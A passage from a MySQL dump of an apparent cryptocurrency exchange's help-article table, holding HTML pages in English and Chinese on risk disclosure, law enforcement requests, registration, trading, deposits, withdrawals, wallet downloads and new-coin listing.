risks include security breaches, risk\r\nof contractual breach, and risk of loss. Participants should be wary of\r\nallowing third parties to hold their property for any reason. Trading Risk: In\r\naddition to liquidity risks, values in any digital token marketplace are\r\nvolatile and can shift quickly. Participants in any Digital Tokens market are\r\nwarned that they should pay close attention to their position and holdings, and\r\nhow they may be impacted by sudden and adverse shifts in trading and other\r\nmarket activities. Risks Associated with Financing Activities: When you finance\r\na purchase or sale of Digital Tokens on a peer-to-peer basis, you run the risk\r\nof losing your provided financing. Similarly, when you accept financing to\r\nenter a trading agreement, you accept the risk of not being able to repay that\r\nfinancing (e.g., if the market price of the Digital Token you purchased with\r\nthe financing falls). Participants should know all of the terms of any\r\ncontracts they enter and how their trading strategies and other market and risk\r\nfactors can affect their financing obligations.</span>\r\n	</p>\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<span style=\"font-size:12.0pt;font-family:宋体;\">Law Enforcement Requests Policy</span>\r\n	</p>\r\n	<p class=\"MsoNormal\" style=\"text-align:left;background:white;\" align=\"left\">\r\n		<span style=\"font-size:12.0pt;font-family:宋体;\">From time to time, MEUNITE\r\nreceives information requests about its customers from law enforcement agencies\r\naround the world. This page is here to provide you and law enforcement with\r\ninformation about how these requests are processed. When MEUNITE is contacted,\r\nlaw enforcement is generally interested in two types of data: information about\r\ncustomers’ identities and information about their trading activities. When\r\ninformation requests are received, MEUNITE requires that it be accompanied by\r\nappropriate legal process. This can vary from place to place. For example,\r\nproduction orders, search warrants, and subpoenas may all amount to legal\r\nprocess. MEUNITE reviews each order to determine that it has valid legal basis\r\nand that any response is narrowly tailored to ensure that only the data to\r\nwhich law enforcement is entitled is provided. MEUNITE also reserves the right\r\nto make disclosures to authorities in order to protect itself, any Associates,\r\nand customers. MEUNITE welcomes inquiries from law enforcement agencies about\r\nits policies and procedures. Please contact MeUnite at support@meunite.com.</span>\r\n	</p>\r\n</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:16px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#F5F5F5;\">\r\n	<span style=\"font-family:\'Microsoft YaHei\';font-size:13px;\"><span style=\"font-family:\'Microsoft YaHei\';font-size:13px;\"></span></span> \r\n</p>', null, '6', '1476097497', '1476097498', '1');
INSERT INTO `movesay_article_type` VALUES ('10', 'a', 'Registration Guide', null, '', '0', '1', 'help', '<p>\r\n	<span style=\"color:#666666;font-family:tahoma,\" font-size:14px;font-style:normal;font-weight:normal;line-height:24px;background-color:#ffffff;\"=\"\"></span>\r\n</p>\r\n<p style=\"margin-left:0cm;\">\r\n	1. Open the homepage of the trading platform, click 【Register】 or 【Free Registration】 to enter the registration page. Register a new account or bind an existing account.<br />\r\n2. Fill in the common e-mail (for login and retrieve password), login password (need to set more than 6), invitation code, and carefully read the \"Registration Agreement\", click 【Next】. Note: The invitation code is optional. Fill in the transaction password (fill in more than 6, and the login password is different), click [Next] after confirmation.<br />\r\n3. Fill in the transaction password (fill in more than 6, and with the login password is different), click [Next] after confirmation.<br />\r\n4. According to the relevant provisions of the state, the US Internet users need to register real-name registration.<br />\r\nPlease select the type of document (default ID card, passport / officer card / Hong Kong and Macau Pass), and then click [Next] after inputting the real ID information of the user (the file information can not be modified after registration).<br />\r\nNote: Bank card information should be the same with the identity information, please fill out the true identity information, so as not to inconvenience<br />\r\n5. Register successfully. After the account can be directly charged and transactions.\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><br />\r\n</span> \r\n</p>', null, '1', '1476153836', '1476153838', '1');
INSERT INTO `movesay_article_type` VALUES ('11', 'b', ' Trading Guide', null, '', '0', '1', 'help', '<p>\r\n	<br />\r\n</p>\r\n<p style=\"margin-left:0cm;\">\r\n	<strong>买入<span>指南</span></strong> \r\n</p>\r\n<p>\r\n	1.首先，进入美联网首页，登录已有账号，将鼠标放在【交易中心】按钮上，页面将显示美联网上所有类别的币种，选择您想交易的币种:以烯量币买入为例(页面跳转到烯量币交易页面，在其他用户所有卖单中选择购买，点击买入。\r\n</p>\r\n<p>\r\n	2.买入成功，可在【财务中心】-【委托管理】中查询挂单委托情况。付款到对方指定收款账户，然后在委托管理中上传交易凭证小票，点击确认付款，等待卖家确认。注：如卖方长时间没有确认收款，可以查看对方联系方式，主动联系卖家。\r\n</p>\r\n<p>\r\n	3. 也可在【财务中心】-【成交查询】中查询挂单成交情况。\r\n</p>\r\n<p>\r\n	4.挂单成交后，请刷新页面，点击【财务中心】查看资产变化。<span class=\"apple-converted-space\">&nbsp;</span><br />\r\n如有挂单其他问题，可咨询在线客服。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	.....................................................................................................................\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<span><span><strong><span><span><span>卖出指南</span></span></span></strong></span></span> \r\n</p>\r\n<p>\r\n	1.页面跳转到烯量币交易页面，在卖出栏中填入【卖出价格】【卖出数量】【交易密码】，点击【卖出】。系统将自动成交挂单。注：卖出数量应小于等于【最大可买】。 虚拟币买入数量不能小于0.1； 不同虚拟币的买入手续费不同，请买入前仔细确认金额。\r\n</p>\r\n<p>\r\n	2. 挂单成功后，可在【财务中心】-【委托管理】中查询挂单委托情况。注：若挂单价格与当前市价不吻合，可能导致挂单不能及时成交。可稍作等待，观察行情。若挂单仍未成交，可撤销（交易中心-我的委托挂单-撤销）挂单调整价格重新挂单。撤销后，未成交部分资产（如买币时冻结的资金、卖币时冻结的币）将原数返还到您的平台账户中。\r\n</p>\r\n<p>\r\n	3. 也可在【财务中心】-【成交查询】中查询挂单成交情况。\r\n</p>\r\n<p>\r\n	4. 挂单成交后，请刷新页面，点击【财务中心】查看资产变化。<span class=\"apple-converted-space\">&nbsp;</span><br />\r\n如有挂单其他问题，可咨询在线客服。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', null, '2', '1476154200', '1476154201', '1');
INSERT INTO `movesay_article_type` VALUES ('12', 'c', '充值指南', null, '', '0', '1', 'help', '<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">首先，进入ofc烯量资产首页（www.ofc.ziyuan800.com），登录已有账号，点击【去财务中心】或在导航栏选择【财务中心】。（<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">人民币充值有两种： 在线自动充值和银行转账充值。以下分别演示两种充值方式流程。）</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">1.在页面左侧菜单选择【人民币在线自动充值】，填写充值金额，点击【到网上银行支付】。<span class=\"Apple-converted-space\">&nbsp;</span></span><br />\r\n<span class=\"impo\" style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:red;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">注：每次充值最少不少于100元，最多不超过5万元。</span><br />\r\n</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">2.确认充值信息，核实无误后点击【确认提交】。<span class=\"Apple-converted-space\">&nbsp;</span></span><br />\r\n<span class=\"impo\" style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:red;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">注：Chrome浏览器可能不支持部分银行的网银控件，建议使用IE内核浏览器进行充值。</span><br />\r\n</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">3.请确认充值金额，并选择银行进行付款。（以招商银行为例）</span><br />\r\n</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">4.根据银行提示完成网上支付。<span class=\"Apple-converted-space\">&nbsp;</span></span><br />\r\n<span style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">1）选择卡号密码支付，输入银行卡号及网上支付密码，完成支付。</span><br />\r\n</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span class=\"impo\" style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:red;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">注：部分银行可能需要下载插件，安装插件后，请重新启动浏览器。</span><br />\r\n<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">2）选择手机支付，输入手机号码、卡号后四位，完成支付。</span><br />\r\n</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">提示充值成功后，请刷新或重新登录账户查看资产。<span class=\"Apple-converted-space\">&nbsp;</span></span><br />\r\n<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">具体到账时间根据不同银行的受理时间而定，请耐心等待。若转账后超过1小时仍未入账，请联系在线客服400-888-8888。</span></span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">注：汇款人姓名默认为实名认证的姓名，仅允许使用本人的银行卡或支付宝进行转账充值。</span></span></span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">2. 页面弹出平台的收款账号及汇款信息，请根据“银行转账汇款”信息通过网银、去银行柜台或使用支付宝进行转账汇款。<span class=\"Apple-converted-space\"> </span></span><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><br />\r\n</span></span></span></span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">3. 银行转账成功后，ofc会在收到汇款后30分钟内入账。请及时刷新页面，并查看资产。 若转账后超过30分钟仍未入账，请联系在线客服400-888-8888。</span><br />\r\n<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"></span></span></span></span></span>\r\n</p>', null, '3', '1476154517', '1476154528', '0');
INSERT INTO `movesay_article_type` VALUES ('13', 'd', '充值限额', null, '', '0', '1', 'help', '<img src=\"/Upload/article/57fc5518b70f4.png\" alt=\"\" /><br />', null, '4', '1476154655', '1476154658', '0');
INSERT INTO `movesay_article_type` VALUES ('14', 'e', '提现指南', null, '', '0', '1', 'help', '<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">1.进入首页（www.ofc.ziyuan800.com），登录已有账号，点击【去财务中心】或在导航栏选择【财务中心】</span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">2.人民币提现操作需绑定用户本人的银行卡，在页面左侧菜单选择【人民币提现】，点击【管理银行卡】。若已绑定可直接申请提现</span><br />\r\n</span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">3.进入银行卡管理页面，填写用户本人的银行卡信息（储蓄卡/借记卡）后，点击【添加银行卡】。</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"></span><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">注：姓名栏，系统默认为实名认证姓名。<span class=\"Apple-converted-space\">&nbsp;</span></span><br />\r\n<span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">若此处的姓名与本人真实姓名不符，请联系在线客服400-888-8888。</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">4.银行卡添加成功后，返回【人民币提现】页面，填写提现申请。</span><br />\r\n</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">注：提现金额单笔最低可申请100元，最高50000元。提现手续费率为提现金额的0.5％，每笔提现最低收费2元。</span><br />\r\n</span></span>\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#FF0000;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\">5.申请提现后，财务会在24小时之内处理提现。请耐心等待并随时关注银行账户资金变动。若超过24小时仍未到账，请联系在线客服400-888-8888。</span></span><br />\r\n</span>\r\n</p>', null, '5', '1476154762', '1476154765', '0');
INSERT INTO `movesay_article_type` VALUES ('15', 'aa', 'Wallet Download ', '', '', '0', '1', 'xiazai', '<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"> </span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><img src=\"http://ofc.ziyuan800.com/Upload/article/580436135bb2a.png\" alt=\"\" height=\"52\" width=\"52\" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BITCOIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"https://bitcoin.org/en/\" target=\"_blank\"><span id=\"result_box\" class=\"short_text\"><span class=\"\">Wallet download</span></span></a><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><img src=\"http://ofc.ziyuan800.com/Upload/article/57fc4b01d610d.jpg\" alt=\"\" />&nbsp;&nbsp;&nbsp;&nbsp; LITECOIN &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"https://litecoin.org/zh_CN/\" target=\"_blank\"><span id=\"result_box\" class=\"short_text\"><span class=\"\">Wallet download</span></span></a>&nbsp; <br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<img src=\"http://ofc.ziyuan800.com/Upload/article/58043670dcb89.png\" alt=\"\" height=\"55\" width=\"55\" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"font-size:14px;\"> ETHERIUM&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"http://coinmarketcap.com/currencies/ethereum/\" target=\"_blank\"><span style=\"font-size:14px;\"><span id=\"result_box\" class=\"short_text\"><span class=\"\">Wallet download</span></span></span></a> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<img src=\"/Upload/article/580439dd7f6ab.png\" alt=\"\" height=\"66\" width=\"64\" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"font-size:14px;\"> OLEFINCOIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span id=\"result_box\" class=\"short_text\"><span class=\"\"><a href=\"http://olefinworld.org/cn/index.html\" target=\"_blank\">Wallet download</a></span></span></span><br />\r\n<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"></span> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<span style=\"font-size:14px;\"></span><br />\r\n<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"></span> \r\n</p>\r\n<br />', '', '1', '1476153159', '1476153162', '1');
INSERT INTO `movesay_article_type` VALUES ('16', 'bb', 'Explorer Download', null, '', '0', '1', 'xiazai', '<p>\r\n	<img src=\"/Upload/article/57fc489875734.jpg\" alt=\"\" />&nbsp;&nbsp;&nbsp; <span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\">FireFox 火狐浏览器</span>&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"http://www.firefox.com.cn/\" target=\"_blank\"><span style=\"font-size:14px;\"><span id=\"result_box\" class=\"short_text\"><span><span id=\"result_box\" class=\"short_text\"><span class=\"\">Download the official website</span></span></span><span class=\"\"></span></span></span><br />\r\n</a> \r\n</p>\r\n<p>\r\n	<img src=\"/Upload/article/57fc48bd5f44e.jpg\" alt=\"\" />&nbsp;&nbsp;&nbsp; <span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\">Chrome 谷歌浏览器&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"https://www.google.com/intl/zh-CN/chrome/browser/\" target=\"_blank\"><span id=\"result_box\" class=\"short_text\"><span><span id=\"result_box\" class=\"short_text\"><span class=\"\">Download the official website</span></span></span><span class=\"\"></span></span></a></span><br />\r\n<a href=\"http://www.firefox.com.cn/\" target=\"_blank\"></a> \r\n</p>', null, '2', '1476151622', '1476151627', '1');
INSERT INTO `movesay_article_type` VALUES ('17', 'cc', '新币上线申请', null, '', '0', '1', 'xiazai', '<span style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\">&nbsp;&nbsp; 若您是加密数字货币开发者或者官方团队成员，有意向将您开发的币种上线聚币网，欢迎您通过以下方式和流程递交申请。</span><span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"></span>\r\n<p style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	申请流程：\r\n</p>\r\n<ol style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	<li style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;\">\r\n		下载<span class=\"Apple-converted-space\">&nbsp;</span><a href=\"https://www.jubi.com/newcoin-sheet.docx\" target=\"_blank\">“新币上线申请表”</a>，按要求填写并发送至邮箱111111@ofc.com。\r\n	</li>\r\n	<li style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;\">\r\n		若申请资料填写齐全并符合聚币上线条件，我们将和申请人或官方团队联系并确定币种上线可行性。\r\n	</li>\r\n	<li style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;\">\r\n		确定上线币种后，聚币会安排技术进行钱包、交易相关开发，我们将至少提前1天通知上线新币 。\r\n	</li>\r\n</ol>\r\n<p style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	另：若在聚币已上线的币种出现下列情况之一，聚币将考虑下线该币种。\r\n</p>\r\n<ol style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	<li style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;\">\r\n		官方团队解散或者不再有正常维护更新，导致该币种不能进行正常挖矿、转币、区块查询等；\r\n	</li>\r\n	<li style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;\">\r\n		该币种已经没有用户进行交易或者使用、持有；\r\n	</li>\r\n	<li style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;\">\r\n		该币种出现重大技术故障，影响到区块查询、挖矿转币等正常功能；\r\n	</li>\r\n	<li style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;color:#333333;\">\r\n		官方团队涉嫌恶意预挖、传销诈骗、坐庄圈钱等欺诈行为。\r\n	</li>\r\n</ol>\r\n<p style=\"font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, 